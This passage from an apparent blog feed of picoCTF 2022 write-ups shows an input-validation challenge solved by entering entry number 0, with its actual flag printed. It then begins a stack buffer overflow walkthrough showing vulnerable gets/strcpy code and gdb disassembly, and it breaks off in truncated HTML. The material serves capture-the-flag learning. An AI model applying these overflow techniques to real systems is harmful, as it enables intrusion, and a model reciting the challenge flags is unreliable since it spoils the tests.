<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget https://artifacts.picoctf.net/c/537/program-redacted.c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">compile.sh program-redacted.c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Testing binary out, we can see that there's a menu where we can type a choice to (1) insert some data, (2) read some data and (3) exit the program.</p>
<p>If we look at the program source code, we can see that the flag will be printed out to the console when the following condition is met:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grep "flag" program-redacted.c -B1 | tail -2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">entry_number </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strtol</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">entry</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So what we need to do is make sure that the expression <code>strtol(entry, NULL, 10)</code> is equal to 0.</p>
<p><code>strtol</code> is a function that converts a string to a long integer value and has the following declaration:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">strtol</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">str</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token plain">endptr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> base</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The first argument is the actual string where the number can be found.</p>
<p>The second argument is a pointer to the remaining string after the number has been extracted from the first argument.</p>
<p>The third argument is the base (binary, octal, decimal, hexadecimal).</p>
<p>Now that we understand what the <code>strtol</code> function does, we can see that we're going to convert the <code>entry</code> into a base 10 integer and set it to the <code>entry_number</code> variable. The <code>if</code> condition checks if <code>entry_number</code> is 0.</p>
<p>This essentially means that we need to feed number <code>0</code> into the program when it's asking us for the entry number.</p>
<p>Trying that, we see that there's validation if we haven't yet entered any data into the program (option 1):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./program-redacted-32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi, welcome to my echo chamber!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '1' to enter a phrase into our database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '2' to echo a phrase in our database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '3' to exit the program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No data yet</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Let's try to first enter some dummy data:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./program-redacted-32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi, welcome to my echo chamber!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '1' to enter a phrase into our database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '2' to echo a phrase in our database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '3' to exit the program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your data:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">give me the flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter the length of your data:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Your entry number is: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Write successful, would you like to do anything else?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter the entry number of your data:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[REDACTED]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Great, so we see that this works locally!</p>
<p>Running the same sequence of inputs on the actual CTF server, we get the actual flag:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">❯ nc saturn.picoctf.net 52682</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hi, welcome to my echo chamber!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '1' to enter a phrase into our database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '2' to echo a phrase in our database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '3' to exit the program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter your data:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">give me the flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">give me the flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter the length of your data:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Your entry number is: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Write successful, would you like to do anything else?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter the entry number of your data:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_038A9E95}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[buffer overflow 0]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_0/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_0/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[https://play.picoctf.org/events/70/challenges/challenge/257]]></description>
            <content:encoded><![CDATA[<p><a href="https://play.picoctf.org/events/70/challenges/challenge/257" target="_blank" rel="noopener noreferrer">https://play.picoctf.org/events/70/challenges/challenge/257</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_0/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Smash the stack</p>
<p>Let's start off simple, can you overflow the correct buffer?</p>
<p>The program is available <a href="https://artifacts.picoctf.net/c/520/vuln" target="_blank" rel="noopener noreferrer">here</a>. You can view source <a href="https://artifacts.picoctf.net/c/520/vuln.c" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>And connect with it using:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 53935</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting">Exploiting<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/buffer_overflow_0/README#exploiting" class="hash-link" aria-label="Direct link to Exploiting" title="Direct link to Exploiting">​</a></h2>
<p>When we run the program for the first time, we see that it's requesting us to create a flag in the directory. Let's do that:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please create 'flag.txt' in this directory with your own debugging flag.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># As requested above</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo "picoCTF{some_flag}" &gt;&gt; flag.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After the flag is there, we can see that the program asks us for an input</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Input: </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we look at what happens to this input in the source code, we can see that the input is copied into a variable character buffer of size <code>100</code> and then passed onto the <code>vuln</code> function:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Input: "</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">fflush</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">stdout</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">gets</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">vuln</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In the <code>vuln</code> method, we see that this buffer is then copied into another variable character of size <code>16</code>:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">vuln</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">input</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf2</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">strcpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> input</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So we know that we can overflow the buffer if our input is larger than <code>16</code>.</p>
<p>Let's run the program with <code>gdb</code> and take a closer look at the program.</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gdb ./vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) disas vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Dump of assembler code for function vuln:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e3f &lt;+0&gt;:     endbr32 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e43 &lt;+4&gt;:     push   %ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e44 &lt;+5&gt;:     mov    %esp,%ebp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e46 &lt;+7&gt;:     push   %ebx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e47 &lt;+8&gt;:     sub    $0x10,%esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e4a &lt;+11&gt;:    call   0x8049f53 &lt;__x86.get_pc_thunk.ax&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e4f &lt;+16&gt;:    add    $0x9b1b1,%eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e54 &lt;+21&gt;:    pushl  0x8(%ebp)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e57 &lt;+24&gt;:    lea    -0x14(%ebp),%edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e5a &lt;+27&gt;:    push   %edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e5b &lt;+28&gt;:    mov    %eax,%ebx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e5d &lt;+30&gt;:    call   0x8049030</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e62 &lt;+35&gt;:    add    $0x8,%esp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e65 &lt;+38&gt;:    nop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e66 &lt;+39&gt;:    mov    -0x4(%ebp),%ebx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e69 &lt;+42&gt;:    leave  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   0x08049e6a &lt;+43&gt;:    ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can see that there's a system call at the 30th bit from the beginning of the <code>vuln</code> function (<code>0x08049e5d &lt;+30&gt;:    call   0x8049030</code>).
This is likely the location of the <code>strcpy</code> instruction where the overflow occurs. Let's put a breakpoint right after this system call to look at the stack and run the program with 20 <code>U</code>s:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) b * vuln +35          </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1 at 0x8049e62: file vuln.c, line 18. </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) r </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: ~/ctf/pico_2022/binary_exploitation/buffer_overflow_0/vuln</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Input: UUUUUUUUUUUUUUUUUUUU</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1, 0x08049e62 in vuln (input=0xffffcae8 'U' &lt;repeats 20 times&gt;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    at vuln.c:18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 